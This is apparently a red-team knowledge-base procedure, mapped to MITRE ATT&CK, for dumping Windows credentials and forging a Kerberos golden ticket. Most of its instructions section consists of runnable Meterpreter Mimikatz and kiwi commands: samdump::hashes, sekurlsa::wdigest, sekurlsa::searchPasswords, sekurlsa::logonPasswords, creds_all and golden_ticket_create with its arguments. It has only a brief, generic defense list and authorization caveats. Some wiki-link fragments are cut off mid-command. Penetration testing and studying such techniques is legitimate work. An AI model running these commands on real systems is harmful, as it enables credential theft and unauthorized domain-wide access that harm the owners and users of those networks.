---
id: 77d85f06-cc46-4cd7-b003-dccc1c27f3e0
name: Credential Dumping and Golden Ticket Creation with Metasploit and Mimikatz
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.547839+00:00'
updated_at: '2023-04-10T20:24:57.205694+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
tags:
- '[[Metasploit]]'
- '[[Meterpreter - Basic]]'
- '[[Mimikatz]]'
commands:
- '[[Credentials Retrieved]]'
- '[[Golden Ticket Created]]'
- '[[Kiwi Loaded]]'
- '[[Logon Passwords]]'
- '[[Mimikatz Version]]'
- '[[SAM Dump Hashes]]'
- '[[Search Passwords]]'
- '[[WDigest Credentials]]'
---

# Credential Dumping and Golden Ticket Creation with Metasploit and Mimikatz

## Summary

This procedure utilizes the Metasploit framework and Mimikatz tool to dump credentials from a compromised Windows machine and create a Golden Ticket. The Golden Ticket can be used to bypass authentication and gain access to any machine in the domain. This technique can be used for lateral movement 

## Description

# Description

This procedure utilizes the Metasploit framework and Mimikatz tool to dump credentials from a compromised Windows machine and create a Golden Ticket. The Golden Ticket can be used to bypass authentication and gain access to any machine in the domain. This technique can be used for lateral movement and privilege escalation.

Technical Explanation: The Metasploit framework is used to gain initial access to a Windows machine and then a Meterpreter session is established. Once the session is established, Mimikatz is uploaded to the target machine and used to dump credentials from memory. The dumped credentials are then used to create a Golden Ticket, which can be used to authenticate to any machine in the domain as any user.

Business Value: This procedure can be used by red teams to test the effectiveness of their organization's security controls. It can also be used by penetration testers to demonstrate the impact of a successful attack to stakeholders.

## Requirements

1. Access to a Windows machine

1. Metasploit framework installed

1. Mimikatz tool uploaded to the target machine

## Defense

1. Implement strong password policies and multi-factor authentication to make it harder for attackers to obtain valid credentials

1. Monitor for suspicious activity such as multiple failed login attempts or unusual authentication requests

1. Regularly review and update security controls to ensure they are effective against current threats

## Objectives

1. Dump credentials from a Windows machine

1. Create a Golden Ticket for lateral movement and privilege escalation

# Instructions

1. This command loads the Mimikatz tool and executes several commands to dump Windows credentials. The `samdump::hashes` command dumps the password hashes for local user accounts, while `sekurlsa::wdigest` and `sekurlsa::searchPasswords` dump plaintext passwords from memory. Finally, `sekurlsa::logonPasswords` dumps plaintext passwords for logged on users. 

**Code**: [[load mimikatz
mimikatz_command -f version
mimikatz]]

> Make sure to execute this command with administrative privileges, as it requires elevated access to dump credentials. Additionally, be aware that dumping credentials may be illegal or violate company policies if done without proper authorization.

**Command** ([[Mimikatz Version]]):

```bash
mimikatz_command -f version
```

**Command** ([[SAM Dump Hashes]]):

```bash
mimikatz_command -f samdump::hashes
```

**Command** ([[WDigest Credentials]]):

```bash
mimikatz_command -f sekurlsa::wdigest
```

**Command** ([[Search Passwords]]):

```bash
mimikatz_command -f sekurlsa::searchPasswords
```

**Command** ([[Logon Passwords]]):

```bash
mimikatz_command -f sekurlsa::logonPasswords full
```

2. To create a golden ticket, you need to provide the following arguments:
-d: Domain name
-k: NT hash of the krbtgt account
-s: SID without the RID
-u: User account for the ticket
-t: Location to store the ticket

Once you have provided these arguments, run the command to create the golden ticket.

**Code**: [[load kiwi
creds_all
golden_ticket_create -d <domai]]

> This command creates a golden ticket, which is a forged Kerberos ticket that can be used to gain unauthorized access to a network. It is typically used in advanced persistent threat (APT) attacks. It is important to note that this command should only be used for ethical purposes, such as penetration testing or red team exercises, and should never be used for malicious purposes.

**Command** ([[Kiwi Loaded]]):

```bash
load kiwi
```

**Command** ([[Credentials Retrieved]]):

```bash
creds_all
```

**Command** ([[Golden Ticket Created]]):

```bash
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[Credentials Retrieved]]
- [[Golden Ticket Created]]
- [[Kiwi Loaded]]
- [[Logon Passwords]]
- [[Mimikatz Version]]
- [[SAM Dump Hashes]]
- [[Search Passwords]]
- [[WDigest Credentials]]

## Tags

- [[Metasploit]]
- [[Meterpreter - Basic]]
- [[Mimikatz]]
